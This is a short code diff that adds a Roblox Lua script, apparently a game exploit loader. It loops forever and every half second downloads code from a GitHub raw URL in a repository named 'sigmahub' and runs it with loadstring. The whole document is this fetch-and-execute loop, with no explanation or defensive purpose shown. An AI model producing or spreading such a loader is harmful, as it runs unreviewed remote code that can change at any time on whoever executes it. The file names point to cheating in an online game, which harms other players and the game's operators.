@@ -1,0 +1,5 @@
+while true do
+    wait(0.5)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Mix10MaxV2/sigmahub/refs/heads/main/ammo556'))()
+end
+   
